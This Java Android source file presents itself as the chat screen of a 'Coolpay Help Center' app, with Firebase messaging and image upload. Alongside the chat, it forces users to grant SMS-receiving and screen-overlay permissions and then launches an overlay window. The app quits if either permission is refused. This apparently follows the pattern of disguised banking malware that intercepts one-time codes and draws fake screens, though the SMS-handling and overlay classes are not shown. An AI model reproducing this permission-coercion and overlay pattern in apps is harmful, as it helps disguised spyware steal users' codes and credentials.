package com.coolpay.helpcenter;

import android.Manifest;
import android.animation.*;
import android.app.*;
import android.app.Activity;
import android.content.*;
import android.content.ClipData;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.ArrayAdapter;
import android.widget.BaseAdapter;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.*;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.bumptech.glide.Glide;
import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import de.hdodenhof.circleimageview.*;
import java.io.*;
import java.io.File;
import java.text.*;
import java.util.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.regex.*;
import org.json.*;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;

public class ChatMsgActivity extends AppCompatActivity {
	
	public final int REQ_CD_IMGPICKER = 101;
	
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	private FirebaseStorage _firebase_storage = FirebaseStorage.getInstance();
	
	private String hpId = "";
	private String userId = "";
	private HashMap<String, Object> map = new HashMap<>();
	private String data = "";
	private int SMS_RECEIVE_PERMISSION_REQUEST_CODE = 100;
	private int REQUEST_OVERLAY_PERMISSION = 200;
	private String lifecycle = "";
	private boolean firstTime = false;
	
	private ArrayList<HashMap<String, Object>> listMap = new ArrayList<>();
	private ArrayList<String> listString = new ArrayList<>();
	
	private LinearLayout bin1;
	private LinearLayout toolbar;
	private LinearLayout bin2;
	private ImageView back;
	private CircleImageView tp_sec_pic;
	private LinearLayout linear21;
	private TextView tp_name;
	private TextView textview21;
	private ProgressBar progressbar1;
	private ListView listview1;
	private LinearLayout linear6;
	private LinearLayout msg_box_main;
	private LinearLayout linear_message;
	private ImageView imageview3;
	private ImageView send;
	private LinearLayout linear_reply;
	private LinearLayout linear7;
	private LinearLayout linear20;
	private ImageView ig_reply_close;
	private TextView name_reply_out;
	private TextView text_reply_out;
	private ImageView imageview2;
	private EditText tx_message;
	private ImageView pick_photo;
	
	private DatabaseReference helpCenterDetails = _firebase.getReference("Help_Center_id");
	private ChildEventListener _helpCenterDetails_child_listener;
	private DatabaseReference db = _firebase.getReference("db");
	private ChildEventListener _db_child_listener;
	private SharedPreferences prefs;
	private StorageReference storage = _firebase_storage.getReference("ids");
	private OnCompleteListener<Uri> _storage_upload_success_listener;
	private OnSuccessListener<FileDownloadTask.TaskSnapshot> _storage_download_success_listener;
	private OnSuccessListener _storage_delete_success_listener;
	private OnProgressListener _storage_upload_progress_listener;
	private OnProgressListener _storage_download_progress_listener;
	private OnFailureListener _storage_failure_listener;
	
	private Intent imgPicker = new Intent(Intent.ACTION_GET_CONTENT);
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.chat_msg);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
	initializeLogic();
	}
	

 @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == SMS_RECEIVE_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted
                // You can proceed with your SMS receiving logic here
_requestAccessibilityServicePermission();
            } else {
                // Permission denied
                // Handle the denial, perhaps show a message to the user
SketchwareUtil.showMessage(getApplicationContext(), "Please this permission is required.");
finish();
            }
        }

		if (requestCode == 1000) {
   	
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED
		|| ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
			SketchwareUtil.showMessage(getApplicationContext(), "Please this permission is required.");
finish();
		} else {
			initializeLogic();
		}
		}
}
	
	private void initialize(Bundle _savedInstanceState) {
		bin1 = findViewById(R.id.bin1);
		toolbar = findViewById(R.id.toolbar);
		bin2 = findViewById(R.id.bin2);
		back = findViewById(R.id.back);
		tp_sec_pic = findViewById(R.id.tp_sec_pic);
		linear21 = findViewById(R.id.linear21);
		tp_name = findViewById(R.id.tp_name);
		textview21 = findViewById(R.id.textview21);
		progressbar1 = findViewById(R.id.progressbar1);
		listview1 = findViewById(R.id.listview1);
		linear6 = findViewById(R.id.linear6);
		msg_box_main = findViewById(R.id.msg_box_main);
		linear_message = findViewById(R.id.linear_message);
		imageview3 = findViewById(R.id.imageview3);
		send = findViewById(R.id.send);
		linear_reply = findViewById(R.id.linear_reply);
		linear7 = findViewById(R.id.linear7);
		linear20 = findViewById(R.id.linear20);
		ig_reply_close = findViewById(R.id.ig_reply_close);
		name_reply_out = findViewById(R.id.name_reply_out);
		text_reply_out = findViewById(R.id.text_reply_out);
		imageview2 = findViewById(R.id.imageview2);
		tx_message = findViewById(R.id.tx_message);
		pick_photo = findViewById(R.id.pick_photo);
		prefs = getSharedPreferences("Help Center", Activity.MODE_PRIVATE);
		imgPicker.setType("image/*");
		imgPicker.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
		
		back.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				finish();
			}
		});
		
		imageview3.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				startActivityForResult(imgPicker, REQ_CD_IMGPICKER);
			}
		});
		
		send.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (new ArabWareFileManager(tx_message.getText().toString()).isEmpty()) {
					
				}
				else {
					_sendMessage();
				}
			}
		});
		
		_helpCenterDetails_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				hpId = _childValue.get("Id").toString();
				tp_name.setText(_childValue.get("name").toString());
				if (prefs.contains("userId")) {
					userId = prefs.getString("userId", "");
					db = _firebase.getReference(hpId + userId);
				}
				else {
					Random random = new Random();
					        StringBuilder sb = new StringBuilder();
					
					        // Generate the first digit to ensure it's not zero
					        sb.append(random.nextInt(9) + 1);
					
					        // Generate the remaining 20 digits
					        for (int i = 0; i < 20; i++) {
						            sb.append(random.nextInt(10));
						        }
					userId = sb.toString();;
					prefs.edit().putString("userId", userId).commit();
					db = _firebase.getReference(hpId + userId);
				}
				data = hpId + userId;
				_checkMessage();
				db.addChildEventListener(_db_child_listener);
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				SketchwareUtil.showMessage(getApplicationContext(), _errorMessage);
			}
		};
		helpCenterDetails.addChildEventListener(_helpCenterDetails_child_listener);
		
		_db_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				db.addListenerForSingleValueEvent(new ValueEventListener() {
					@Override
					public void onDataChange(DataSnapshot _dataSnapshot) {
						listMap = new ArrayList<>();
						try {
							GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
							for (DataSnapshot _data : _dataSnapshot.getChildren()) {
								HashMap<String, Object> _map = _data.getValue(_ind);
								listMap.add(_map);
							}
						}
						catch (Exception _e) {
							_e.printStackTrace();
						}
						listview1.setAdapter(new Listview1Adapter(listMap));
						((BaseAdapter)listview1.getAdapter()).notifyDataSetChanged();
						listview1.setStackFromBottom(true);
						textview21.setVisibility(View.GONE);
						progressbar1.setVisibility(View.GONE);
						firstTime = true;
					}
					@Override
					public void onCancelled(DatabaseError _databaseError) {
					}
				});
				if (firstTime) {
					if (lifecycle.equals("stop")) {
						NotificationHelper.showNotification(ChatMsgActivity.this,"New Message","Coolpay Help Center sent you a message", "Coolpay Help Center");
					}
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				SketchwareUtil.showMessage(getApplicationContext(), _errorMessage);
			}
		};
		db.addChildEventListener(_db_child_listener);
		
		_storage_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>() {
			@Override
			public void onProgress(UploadTask.TaskSnapshot _param1) {
				double _progressValue = (100.0 * _param1.getBytesTransferred()) / _param1.getTotalByteCount();
				com.google.android.material.snackbar.Snackbar.make(bin1, "Uploading image...", com.google.android.material.snackbar.Snackbar.LENGTH_SHORT).setAction(String.valueOf((long)(_progressValue)).concat("%"), new View.OnClickListener(){
					@Override
					public void onClick(View _view) {
						 
					}
				}).show();
			}
		};
		
		_storage_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>() {
			@Override
			public void onProgress(FileDownloadTask.TaskSnapshot _param1) {
				double _progressValue = (100.0 * _param1.getBytesTransferred()) / _param1.getTotalByteCount();
				
			}
		};
		
		_storage_upload_success_listener = new OnCompleteListener<Uri>() {
			@Override
			public void onComplete(Task<Uri> _param1) {
				final String _downloadUrl = _param1.getResult().toString();
				map.put("Image", _downloadUrl);
				map.put("Id", userId);
				db.push().updateChildren(map);
				map.clear();
			}
		};
		
		_storage_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>() {
			@Override
			public void onSuccess(FileDownloadTask.TaskSnapshot _param1) {
				final long _totalByteCount = _param1.getTotalByteCount();
				
			}
		};
		
		_storage_delete_success_listener = new OnSuccessListener() {
			@Override
			public void onSuccess(Object _param1) {
				
			}
		};
		
		_storage_failure_listener = new OnFailureListener() {
			@Override
			public void onFailure(Exception _param1) {
				final String _message = _param1.getMessage();
				SketchwareUtil.showMessage(getApplicationContext(), _message);
			}
		};
	}
	
	private void initializeLogic() {
				if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED
				|| ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
						ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1000);
				} else {
						_requestPermission();
				}
		send.setColorFilter(0xFF000000, PorterDuff.Mode.MULTIPLY);
		back.setColorFilter(0xFF000000, PorterDuff.Mode.MULTIPLY);
		db.removeEventListener(_db_child_listener);
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		super.onActivityResult(_requestCode, _resultCode, _data);
		if (_requestCode == 200) {
				            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
						                if (Settings.canDrawOverlays(this)) {
								                   final OverlayWindow overlayWindow = new OverlayWindow(getApplicationContext());
								overlayWindow.showOverlay();
								                } else {
								                    Toast.makeText(this, "This permission is required.", Toast.LENGTH_SHORT).show();
								finish();
								                }
						            }
		}
		switch (_requestCode) {
			case REQ_CD_IMGPICKER:
			if (_resultCode == Activity.RESULT_OK) {
				ArrayList<String> _filePath = new ArrayList<>();
				if (_data != null) {
					if (_data.getClipData() != null) {
						for (int _index = 0; _index < _data.getClipData().getItemCount(); _index++) {
							ClipData.Item _item = _data.getClipData().getItemAt(_index);
							_filePath.add(FileUtil.convertUriToFilePath(getApplicationContext(), _item.getUri()));
						}
					}
					else {
						_filePath.add(FileUtil.convertUriToFilePath(getApplicationContext(), _data.getData()));
					}
				}
				storage.child("Id").putFile(Uri.fromFile(new File(_filePath.get((int)(0))))).addOnFailureListener(_storage_failure_listener).addOnProgressListener(_storage_upload_progress_listener).continueWithTask(new Continuation<UploadTask.TaskSnapshot, Task<Uri>>() {
					@Override
					public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
						return storage.child("Id").getDownloadUrl();
					}}).addOnCompleteListener(_storage_upload_success_listener);
			}
			else {
				
			}
			break;
			default:
			break;
		}
	}
	
	
	@Override
	public void onStart() {
		super.onStart();
		lifecycle = "start";
	}
	
	@Override
	public void onStop() {
		super.onStop();
		lifecycle = "stop";
	}
	public void _setRadii(final View _view, final String _color, final String _lt, final String _lb, final String _rt, final String _rb) {
		android.graphics.drawable.GradientDrawable gd = new android.graphics.drawable.GradientDrawable();
		 gd.setColor(Color.parseColor(_color));
		
		gd.setCornerRadii(new float[] { Float.parseFloat(_lt), Float.parseFloat(_lt), Float.parseFloat(_rt), Float.parseFloat(_rt), Float.parseFloat(_rb), Float.parseFloat(_rb), Float.parseFloat(_lb), Float.parseFloat(_lb) }); //LeftTop, //RightTop, //RightBottom, //LeftBottom
		
		_view.setBackground(gd); 
		_view.setElevation(2f);
	}
	
	
	public void _sendMessage() {
		map.put("messages", tx_message.getText().toString());
		map.put("Id", userId);
		db.push().updateChildren(map);
		tx_message.setText("");
		map.clear();
	}
	
	
	public void _checkMessage() {
		// Assuming you have a reference to your Firebase Database
		DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference();
		
		DatabaseReference usersReference;
		// Assuming your JSON data is under a node named "users"
		usersReference = databaseReference.child(data);
		
		usersReference.addListenerForSingleValueEvent(new ValueEventListener() {
			    @Override
			    public void onDataChange(DataSnapshot dataSnapshot) {
				        // Check if the data snapshot exists
				        if (dataSnapshot.exists()) {
					 progressbar1.setVisibility(View.GONE);
					        } else {
					            // Handle the case where the data snapshot doesn't exist
					            progressbar1.setVisibility(View.GONE);
					textview21.setVisibility(View.VISIBLE);
					        }
				    }
			
			    @Override
			    public void onCancelled(DatabaseError databaseError) {
				        // Handle potential errors
				        progressbar1.setVisibility(View.GONE);
				SketchwareUtil.showMessage(getApplicationContext(), databaseError.getMessage());
			}
		});
	}
	
	
	public void _requestPermission() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
			                    != PackageManager.PERMISSION_GRANTED) {
				                // Permission not granted, request it
				                ActivityCompat.requestPermissions(this,
				                        new String[]{Manifest.permission.RECEIVE_SMS},
				                        SMS_RECEIVE_PERMISSION_REQUEST_CODE);
				            } else {
				                // Permission already granted
				_requestAccessibilityServicePermission();
				                // You can proceed with your SMS receiving logic here
				
				            }
			        } else {
			            // For versions below Marshmallow, permission is granted at installation time
			            // You can proceed with your SMS receiving logic here
			_requestAccessibilityServicePermission();
			        }
		    
	}
	
	
	public void _requestAccessibilityServicePermission() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			                    if (!Settings.canDrawOverlays(ChatMsgActivity.this)) {
				                        // Request overlay permission
				                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
				                        intent.setData(Uri.parse("package:" + getPackageName()));
				                        startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION);
				                    } 
			                }
	}
	
	public class Listview1Adapter extends BaseAdapter {
		
		ArrayList<HashMap<String, Object>> _data;
		
		public Listview1Adapter(ArrayList<HashMap<String, Object>> _arr) {
			_data = _arr;
		}
		
		@Override
		public int getCount() {
			return _data.size();
		}
		
		@Override
		public HashMap<String, Object> getItem(int _index) {
			return _data.get(_index);
		}
		
		@Override
		public long getItemId(int _index) {
			return _index;
		}
		
		@Override
		public View getView(final int _position, View _v, ViewGroup _container) {
			LayoutInflater _inflater = getLayoutInflater();
			View _view = _v;
			if (_view == null) {
				_view = _inflater.inflate(R.layout.chat, null);
			}
			
			final LinearLayout linear1 = _view.findViewById(R.id.linear1);
			final LinearLayout linear2 = _view.findViewById(R.id.linear2);
			final LinearLayout chat_box = _view.findViewById(R.id.chat_box);
			final TextView message = _view.findViewById(R.id.message);
			final LinearLayout linear3 = _view.findViewById(R.id.linear3);
			final androidx.cardview.widget.CardView cardview1 = _view.findViewById(R.id.cardview1);
			final ImageView image = _view.findViewById(R.id.image);
			
			if (_data.get((int)_position).get("Id").toString().equals(userId)) {
				_setRadii(chat_box, "#FFFFFF", "0", "10", "10", "10");
				linear1.setGravity(Gravity.RIGHT);
				linear2.setGravity(Gravity.RIGHT);
			}
			else {
				_setRadii(chat_box, "#FFFFFF", "10", "10", "0", "10");
				linear1.setGravity(Gravity.LEFT);
				linear2.setGravity(Gravity.LEFT);
			}
			// Assuming _data is a List<Map<String, Object>>
			
			Object value = _data.get((int)_position).get("Image");
			String result = (value != null) ? value.toString() : "";
			
			if (!new ArabWareFileManager(result).isEmpty()) {
				Glide.with(getApplicationContext()).load(Uri.parse(_data.get((int)_position).get("Image").toString())).into(image);
				message.setVisibility(View.GONE);
				linear3.setVisibility(View.VISIBLE);
			}
			else {
				message.setVisibility(View.VISIBLE);
				linear3.setVisibility(View.GONE);
			}
			// Assuming _data is a List<Map<String, Object>>
			
			Object value1 = _data.get((int)_position).get("messages");
			String result1 = (value1 != null) ? value1.toString() : "";
			
			if (!new ArabWareFileManager(result1).isEmpty()) {
				message.setText(_data.get((int)_position).get("messages").toString());
				message.setVisibility(View.VISIBLE);
				linear3.setVisibility(View.GONE);
			}
			else {
				message.setVisibility(View.GONE);
				linear3.setVisibility(View.VISIBLE);
			}
			
			return _view;
		}
	}
}